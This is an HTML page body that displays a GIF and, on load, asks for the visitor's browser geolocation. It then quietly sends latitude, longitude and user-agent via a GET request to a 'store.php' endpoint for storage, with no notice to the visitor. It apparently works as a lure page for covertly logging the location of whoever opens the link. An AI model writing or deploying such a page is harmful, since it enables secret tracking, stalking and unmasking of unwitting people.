  <body onload="getLocation()" style="background-color: black">
    <img src="rogerio.gif" alt="Descrição do GIF" width="500" height="300" />
    <p id="demo"> </p>
    <script>
        var x = document.getElementById("demo");
        function getLocation(){
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                x.innerHTML = "geolocation is not supported by this browser";
            }
        }
        function showPosition(position){
            const xhttp = new XMLHttpRequest();
            xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
            xhttp.send();
        }
    </script>
